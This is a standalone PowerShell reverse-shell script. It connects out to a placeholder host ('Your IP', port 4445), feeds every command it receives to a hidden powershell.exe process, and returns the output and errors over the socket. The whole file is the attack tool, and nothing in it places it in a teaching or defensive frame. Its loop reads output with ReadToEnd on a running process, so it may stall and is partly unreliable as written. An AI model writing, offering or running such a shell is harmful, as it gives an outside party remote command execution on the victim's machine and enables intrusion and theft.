$TCPClient = New-Object System.Net.Sockets.TCPClient('Your IP', 4445)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object System.IO.StreamWriter($NetworkStream)
$StreamReader = New-Object System.IO.StreamReader($NetworkStream)

$Process = New-Object System.Diagnostics.Process
$Process.StartInfo.FileName = 'powershell.exe'
$Process.StartInfo.RedirectStandardInput = $true
$Process.StartInfo.RedirectStandardOutput = $true
$Process.StartInfo.RedirectStandardError = $true
$Process.StartInfo.UseShellExecute = $false
$Process.Start()

while (1) {
    # Check network stream for incoming data
    if ($NetworkStream.DataAvailable -eq $true) {
        $OutputBuffer = New-Object byte[] 4096
        $BytesRead = $NetworkStream.Read($OutputBuffer, 0, 4096)
        $Command = [System.Text.Encoding]::ASCII.GetString($OutputBuffer, 0, $BytesRead)
        
        # Execute the received command
        $Process.StandardInput.WriteLine($Command + "`n")
        
        # Read output from the process
        $Output = $Process.StandardOutput.ReadToEnd()
        $StreamWriter.Write($Output)
        $StreamWriter.Flush()
    }

    # Check for errors
    if ($Process.StandardError.Peek() -ne -1) {
        $ErrorOutput = $Process.StandardError.ReadToEnd()
        $StreamWriter.Write("[ERROR] $ErrorOutput")
        $StreamWriter.Flush()
    }

    # Sleep for 100ms to avoid busy-waiting
    Start-Sleep -Milliseconds 100

    # Check if the TCP connection is still active
    if ($TCPClient.Connected -eq $false) {
        break
    }
}

$StreamWriter.Close()
$NetworkStream.Close()
$TCPClient.Close()
